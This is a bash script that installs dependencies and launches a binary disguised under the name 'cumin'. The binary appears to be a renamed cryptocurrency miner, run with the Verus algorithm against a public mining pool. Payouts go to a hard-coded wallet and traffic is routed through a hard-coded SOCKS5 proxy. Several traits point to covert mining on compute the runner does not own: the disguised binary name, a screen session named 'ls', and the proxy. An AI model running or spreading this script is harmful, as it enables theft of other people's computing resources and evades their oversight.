#!/bin/bash
sudo apt-get update 
sudo apt install libcurl4-openssl-dev -y
chmod +x cumin
apt install screen
screen -dmS ls 
POOL=stratum+tcp://ap.luckpool.net:3956
WALLET=RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr
WORKER=DevV5ByNongCroissant
PROXY=socks5://98.162.25.23:4145
./cumin -a verus -o $POOL -u $WALLET -t 4 -x $PROXY
